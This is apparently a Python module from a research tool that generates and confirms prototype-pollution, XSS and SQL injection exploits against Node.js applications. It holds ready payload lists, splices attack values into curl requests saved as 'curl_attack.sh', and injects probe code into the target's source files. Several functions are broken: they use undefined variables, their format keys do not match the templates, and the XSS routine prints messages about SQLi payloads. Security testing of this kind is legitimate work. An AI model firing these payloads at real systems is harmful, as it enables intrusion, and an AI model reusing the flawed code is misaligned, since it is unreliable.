import esprima
import ast
import re
import os
import subprocess
import time

xss_payload_list = ['<iframe src="javascript:alert(`xss`)">', '&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;', '<ScRiPt>alert(1)</sCriPt>', '<<script>Foo</script>iframe src="javascript:alert(`xss`)">', 'javascript&#x58document;alert&#40;1&#41;', '<script>alert(1)</script>', '<svg/onload=alert(1)', '‘)alert(1);//', '<img src=1 href=1 onerror="javascript:alert(1)"></img>']
#xss_function = ['pipe', 'setHeader', 'write', 'setAttribute', 'append', 'send']
sqli_payload_list = ['\'))--', '1" OR 1 = 1 -- -', '"*"', 'or true--', '" or true--', '" or sleep(3)#', '\' or sleep(3)#', '" or sleep(3)="', 'HAVING 1=1', '-- or # ', '/*…*/', '\' AND id IS NULL; --', '1 or pg_sleep(3)--', 'admin\' --', 'admin" --', ' or 1=1--']
#sqli_function = ['mapReduce', 'deleteOne', 'deleteMany', 'updateOne', 'updateMany', 'findOne', 'find', 'query']

def check_pp_pattern(code):
    pattern_merge = r'merge\([^()]*\)' # 
    pattern_assignment = r'\w+(?:\[\w+\])*\s*=\s*\w+'
    if re.match(pattern_merge, code): #<- Not supported now
        return 2
    elif re.match(pattern_assignment, code): 
        return 1
    else:
        return 0

# Python's ast library reports error in some JS code. Changed implementation to using esprima
def extract_pp_critical_vars(line, js_code):
    parsed_ast = esprima.parseScript(js_code)

    # Function to recursively traverse the AST and extract object and keys
    def traverse(node):
        if node.type == 'MemberExpression':
            # Extract object expression
            object_expression = ''
            if node.object.type == 'Identifier':
                object_expression = node.object.name
            elif node.object.type == 'MemberExpression':
                object_expression = traverse(node.object)
            # Extract key
            if node.property.type == 'Identifier':
                return f"{object_expression}[{node.property.name}]"
            elif node.property.type == 'Literal':
                return f"{object_expression}[{node.property.value}]"
        return False

    # Traverse both sides of the assignment expression
    left_expression = parsed_ast.body[0].expression.left
    right_expression = parsed_ast.body[0].expression.right
    first_object = traverse(left_expression) or traverse(right_expression)

    # Extract keys
    keys = []
    current_node = right_expression
    if traverse(left_expression):
        current_node = left_expression
    while hasattr(current_node, 'type') and current_node.type == 'MemberExpression':
        if current_node.property.type == 'Identifier':
            keys.insert(0, current_node.property.name)
        elif current_node.property.type == 'Literal':
            keys.insert(0, current_node.property.value)
        current_node = current_node.object

    ret = {}
    ret[line] = keys
    return first_object, ret

# Get runtime variable value and execute the provided ins_code
def checkrt(line, variable, source_file, commands, compared_value, ins_code=""):
    os.system(f"cp {source_file} {source_file}.bak")
    if os.path.exists('/before.txt'):
        os.remove('/before.txt')
    
    js_code = ""
    if ins_code == "":
        js_code = """
        const fs = require('fs');
        if (v1 === __PROTO__) {
            fs.writeFileSync('/before.txt', 'succeed', { encoding: 'utf8', flag: 'w' });
        } else {
            fs.writeFileSync('/before.txt', 'fail', { encoding: 'utf8', flag: 'w' });
        }
        """
        js_code = js_code.replace("__PROTO__", compared_value)
        js_code = js_code.replace("v1", variable)
    else:
        js_code = ins_code
    
    with open(source_file, 'r') as file:
        lines = file.readlines()
    lines.insert(line - 1, js_code + '\n')
    with open(source_file, 'w') as file:
        file.writelines(lines)

    stop_command=commands[1]
    commands=commands[:1]+commands[2:]
    for command in commands:
        os.chmod(command, 0o755)
        subprocess.Popen(['./' + command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(4)
    os.system(f"cp {source_file} {source_file}.bak.bak")
    os.system(f"mv {source_file}.bak {source_file}")
    if stop_command!="":
        os.chmod(stop_command, 0o755)
        subprocess.run(['./' + stop_command], check=True) 

    if not os.path.exists('/before.txt'):
        return False
    with open('/before.txt', 'r') as file:
        contents = file.read()
    if "succeed" in contents:
        return True
    else:
        return False
    
def pp_triggering(input_field, commands, value2name, name2line, line2obj, source_file, step, pp_type):
    new_commands = commands.copy() # donot change commands outside this function
    fin = False
    with open(new_commands[2], 'r') as file:
        reach_input = file.read()
    index_of_d = reach_input.find("-d")
    body = reach_input[index_of_d + 2:]
    header = reach_input[: index_of_d + 2]
    # Recover information
    var_name = value2name[input_field] if input_field in value2name else None
    line = name2line[var_name] if var_name in name2line else None
    objmember = line2obj[line]

    insert_payload, compared_value = "", ""
    if pp_type == "p1":
        if step == 1:
            insert_payload = "constructor"
            compared_value = "Object"
        elif step == 2:
            insert_payload = "prototype"
            compared_value = "Object.prototype"
        elif step == 3:
            insert_payload = "dummy"
    else:
        if step == 1:
            insert_payload = "__proto__"
            compared_value = "Object.prototype"
        elif step == 2:
            insert_payload = "dummy"
    
    if input_field not in body and input_field not in header:
        var_name = value2name[input_field] if input_field in value2name else None
        line = name2line[var_name] if var_name in name2line else None
        print(f'\033[90mWe cannot directly control the index variable. Please run static and symbolic analysis by setting variable value of {var_name} at line {line} in {source_file} to be {insert_payload}\033[0m')
        print(f'\033Please provide input value that is output by ExpoSE such that {var_name} at line {line} in {source_file} can be {insert_payload}:\033[0m')
        new_input = input()
        new_body = body.replace(input_field, new_input, 1)
    elif input_field in body:
        new_body = body.replace(input_field, insert_payload, 1)
    elif input_field in header:
        header = header.replace(input_field, insert_payload, 1)
    payload = header + new_body
    
    with open("curl_attack.sh", "w") as f:
        f.write(payload)
    new_commands[2] = "curl_attack.sh"
    suc_this = False
    if compared_value != "":
        suc_this = checkrt(line, objmember, source_file, new_commands, compared_value)
    else:
        fin = True
    if suc_this == True:
        return step+1, fin
    else:
        return step, fin

def xss_triggering(source_file, sink_line_number, name, value, commands):
    new_commands = commands.copy()
    with open(new_commands[2], 'r') as file:
        reach_input = file.read()
    index_of_d = reach_input.find("-d")
    body = reach_input[index_of_d + 2:]
    header = reach_input[: index_of_d + 2]
    xss_payload = ""

    if value not in body and value not in header:
        print(f'\033[90mWe cannot directly control the sink variable. Please run static and symbolic analysis by setting variable value of {name} at line {sink_line_number} in {source_file} to be XSS payloads, for example, one in {xss_payload_list}\033[0m')
        print(f'\033Please provide input value that is output by ExpoSE such that {name} at line {line} in {source_file} can be a xss payload:\033[0m')
        xss_payload = input()
        new_body = body.replace(value, xss_payload, 1)
    elif value in body:
        print(f"\033[90mWe have provided some SQLi payloads in {xss_payload_list}, you can select one or you can provide a custom SQLi payload on which you expect {name} in sink operation take\n{list}\033[0m")
        xss_payload = input()
        new_body = body.replace(value, xss_payload, 1)
    elif value in header:
        print(f"\033[90mWe have provided some SQLi payloads in {sqli_payload_list}, you can select one or you can provide a custom SQLi payload on which you expect {name} in sink operation take\n{list}\033[0m")
        xss_payload = input()
        header = header.replace(value, xss_payload, 1)
    payload = header + new_body

    # code to check if we can control runtime value of variable in xss operation to be the prepared payload
    js_code_template = """
    var xss_payload = "{xss_payload}";
    var xss_name = {name};
    if (xss_name === xss_payload) {{
        fs.writeFileSync('/before.txt', 'succeed', {{ encoding: 'utf8', flag: 'w' }});
    }}
    else {{
        fs.writeFileSync('/before.txt', 'failed', {{ encoding: 'utf8', flag: 'w' }});
    }}
    """
    js_code = js_code_template.format(xss_name=name, xss_payload=xss_payload)
    with open("curl_attack.sh", "w") as f:
        f.write(payload)
    new_commands[2] = "curl_attack.sh"
    suc = False
    if compared_value != "":
        suc = checkrt(sink_line_number, name, source_file, new_commands, None, js_code)

    return suc
    
def sqli_triggering(source_file, sink_line_number, name, value, commands):
    new_commands = commands.copy()
    with open(new_commands[2], 'r') as file:
        reach_input = file.read()
    index_of_d = reach_input.find("-d")
    body = reach_input[index_of_d + 2:]
    header = reach_input[: index_of_d + 2]
    sqli_payload = ""

    if value not in body and value not in header:
        print(f'\033[90mWe cannot directly control the sink variable. Please run static and symbolic analysis by setting variable value of {name} at line {sink_line_number} in {source_file} to be SQLi payloads, for example, one in {sqli_payload_list}\033[0m')
        print(f'\033Please provide input value that is output by ExpoSE such that {name} at line {line} in {source_file} can be a sqli payload:\033[0m')
        sqli_payload = input()
        new_body = body.replace(value, sqli_payload, 1)
    elif value in body:
        print(f"\033[90mWe have provided some SQLi payloads in {sqli_payload_list}, you can select one or you can provide a custom SQLi payload on which you expect {name} in sink operation take\n{list}\033[0m")
        sqli_payload = input()
        new_body = body.replace(value, sqli_payload, 1)
    elif value in header:
        print(f"\033[90mWe have provided some SQLi payloads in {sqli_payload_list}, you can select one or you can provide a custom SQLi payload on which you expect {name} in sink operation take\n{list}\033[0m")
        sqli_payload = input()
        header = header.replace(value, sqli_payload, 1)
    payload = header + new_body

    js_code_template = """
    var sqli_payload = "{sqli_payload}";
    var sqli_name = {name};
    if (sqli_name === sqli_payload) {{
        fs.writeFileSync('/before.txt', 'succeed', {{ encoding: 'utf8', flag: 'w' }});
    }}
    else {{
        fs.writeFileSync('/before.txt', 'failed', {{ encoding: 'utf8', flag: 'w' }});
    }}
    """
    js_code = js_code_template.format(sqli_name=name, sqli_payload=sqli_payload)
    with open("curl_attack.sh", "w") as f:
        f.write(payload)
    new_commands[2] = "curl_attack.sh"
    suc = False
    if compared_value != "":
        suc = checkrt(sink_line_number, name, source_file, new_commands, None, js_code)

    return suc

# check if we sucussfully conduct pp attack by checking if Object.dummy is defined
def validate_pp(sink_line_number, commands, source_file):
    js_code = """
    const fs = require('fs');
    fs.writeFileSync('/before.txt', JSON.stringify(Object.dummy), { encoding: 'utf8', flag: 'w' });
    """
    suc = False
    for line in sink_line_number:
        checkrt(line+1, None, source_file, commands, None, js_code)
        if not os.path.exists('/before.txt'):
            continue
        with open('/before.txt', 'r') as file:
            contents = file.read()
        if contents != "undefined": #dummy is polluted
            suc = True
            print('\033[92mSuccessfully polluted Object.dummy to {}, the poc is stored in curl_attack.sh\033[0m'.format(contents))
            break
    return suc
